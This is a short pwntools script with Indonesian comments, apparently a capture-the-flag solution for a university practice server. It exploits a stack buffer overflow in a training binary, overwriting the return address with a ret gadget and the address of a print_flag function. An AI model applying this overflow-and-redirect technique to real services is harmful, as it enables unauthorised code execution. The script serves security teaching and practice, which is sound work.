from pwn import *

# Konfigurasi dasar
exe = './chall'
elf = ELF(exe)
context.binary = exe

# Tentukan target: remote atau lokal
# Uncomment baris di bawah ini jika ingin debugging lokal
# io = process(exe) 

# Koneksi ke server remote
io = remote('practice-digitalsecuritylab.di.unipi.it', 10003)

# 1. Menentukan Offset
# Berdasarkan analisis statis: Buffer (32) + S-RBP (8) = 40
offset = 40

# 2. Mencari Gadget & Alamat Target
# Menggunakan ROP object untuk mencari gadget 'ret' secara otomatis
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0] # Mencari alamat instruksi 'ret'

# Mengambil alamat fungsi print_flag dari simbol binary
print_flag_addr = elf.symbols['print_flag']

log.info(f"Offset: {offset}")
log.info(f"Ret Gadget: {hex(ret_gadget)}")
log.info(f"Print Flag Address: {hex(print_flag_addr)}")

# 3. Menyusun Payload
# Susunan: Padding + Ret Gadget (Align Stack) + Fungsi Target
payload = flat({
    offset: [
        ret_gadget,      # Stack alignment (penting untuk x64)
        print_flag_addr  # Loncat ke fungsi print_flag
    ]
})

# 4. Mengirim Payload
io.recvuntil(b'Enter your name: ')
io.sendline(payload)

# 5. Mendapatkan Flag
io.interactive()
